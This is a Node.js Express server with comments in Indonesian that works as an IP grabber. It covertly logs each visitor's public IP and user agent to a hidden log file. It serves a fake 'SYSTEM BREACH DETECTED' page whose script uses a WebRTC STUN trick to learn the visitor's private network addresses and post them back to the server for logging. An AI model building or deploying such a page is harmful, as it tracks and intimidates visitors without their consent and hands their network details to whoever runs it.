const express = require("express");
const fs = require("fs");
const path = require("path");

const app = express();
const PORT = process.env.PORT || 3000;

// Pastikan folder log ada
const logDir = path.join(__dirname, ".logs");
const logFile = path.join(logDir, "ip_log.txt");

if (!fs.existsSync(logDir)) {
    fs.mkdirSync(logDir, { recursive: true });
}

// Fungsi untuk mendapatkan IP pengguna
function getClientIP(req) {
    let ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress || "";

    if (ip.includes(",")) {
        ip = ip.split(",")[0].trim();
    }

    ip = ip.replace(/^::ffff:/, "").trim();

    return ip || "Unknown";
}

// Middleware untuk mencatat IP setiap request
app.use((req, res, next) => {
    try {
        const ip = getClientIP(req);
        const userAgent = req.headers["user-agent"] || "Unknown";
        const log = `IP: ${ip} - User Agent: ${userAgent} - Waktu: ${new Date().toISOString()}\n`;

        fs.appendFileSync(logFile, log);
        console.log(log.trim());
    } catch (error) {
        console.error("Gagal mencatat log:", error);
    }

    next();
});

// Halaman utama dengan efek hacker-style
app.get("/", (req, res) => {
    res.send(`
        <style>
            body {
                background-color: black;
                color: #00ff00;
                font-family: monospace;
                text-align: center;
                padding: 20px;
            }
            h1 {
                font-size: 24px;
                text-shadow: 0px 0px 5px #00ff00;
            }
            p {
                font-size: 18px;
                text-shadow: 0px 0px 5px #00ff00;
            }
            .glitch {
                animation: glitch 0.5s infinite alternate;
            }
            @keyframes glitch {
                0% { text-shadow: 2px 2px 5px #ff0000, -2px -2px 5px #0000ff; }
                100% { text-shadow: -2px -2px 5px #ff0000, 2px 2px 5px #0000ff; }
            }
            .blinking {
                animation: blink 1s infinite alternate;
            }
            @keyframes blink {
                0% { opacity: 1; }
                100% { opacity: 0; }
            }
        </style>

        <h1 class="glitch">⚠ SYSTEM BREACH DETECTED ⚠</h1>
        <p id="public-ip">IP Public: Scanning...</p>
        <p id="private-ip" class="blinking">[ACCESSING PRIVATE NETWORK...]</p>

        <script>
            document.getElementById("public-ip").innerText = "IP Public: ${getClientIP(req)}";

            async function getLocalIPs() {
                const ips = new Set();
                const pc = new RTCPeerConnection({ 
                    iceServers: [{ urls: "stun:stun.l.google.com:19302" }] 
                });

                pc.createDataChannel("");
                pc.createOffer().then(offer => pc.setLocalDescription(offer));

                pc.onicecandidate = event => {
                    if (event.candidate) {
                        const ip = event.candidate.candidate.split(" ")[4];
                        ips.add(ip);
                    } else {
                        const privateIP = [...ips].join(", ") || "Tidak ditemukan";
                        document.getElementById("private-ip").innerText = "IP Private: " + privateIP;
                        
                        fetch("/log-ip", {
                            method: "POST",
                            headers: { "Content-Type": "application/json" },
                            body: JSON.stringify({ privateIP })
                        }).catch(err => console.error("Gagal mengirim IP Private:", err));

                        pc.close();
                    }
                };
            }
            getLocalIPs();
        </script>
    `);
});

// Endpoint untuk mencatat IP Private ke server
app.post("/log-ip", express.json(), (req, res) => {
    try {
        const { privateIP } = req.body;
        const log = `IP Private: ${privateIP} - Waktu: ${new Date().toISOString()}\n`;
        fs.appendFileSync(logFile, log);
        res.send({ status: "Logged" });
    } catch (error) {
        console.error("Gagal mencatat IP Private:", error);
        res.status(500).send({ status: "Error" });
    }
});

// Jalankan server
app.listen(PORT, () => console.log(`Server berjalan di port ${PORT}`));
